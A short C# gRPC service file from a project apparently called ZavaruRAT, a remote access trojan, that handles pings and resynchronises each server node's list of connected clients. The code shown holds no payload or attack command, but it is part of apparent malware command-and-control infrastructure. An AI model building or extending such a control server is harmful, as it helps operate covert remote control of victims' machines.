#region

using Google.Protobuf.WellKnownTypes;
using Grpc.Core;
using Microsoft.AspNetCore.Authorization;
using ZavaruRAT.Main.Runtime;
using ZavaruRAT.Proto;

#endregion

namespace ZavaruRAT.Main.Services;

[Authorize]
public sealed class ActionService : ActionHub.ActionHubBase
{
    private readonly ClientsStorage _storage;
    private readonly ILogger<ActionService> _logger;

    public ActionService(ClientsStorage storage, ILogger<ActionService> logger)
    {
        _storage = storage;
        _logger = logger;
    }

    public override Task<Empty> Ping(Empty request, ServerCallContext context)
    {
        return Task.FromResult(new Empty());
    }

    public override Task<Empty> ResyncClients(ResyncClientsRequest request, ServerCallContext context)
    {
        var nodeId = context.GetNodeId();
        _logger.LogInformation("Node {Node} invoked full clients resync (total {ClientsCount})", nodeId,
                               request.Clients.Count);

        _storage.RemoveClientsFromNodeId(nodeId);
        _storage.AddClientsFromResync(nodeId, request.Clients);

        return Task.FromResult(new Empty());
    }
}
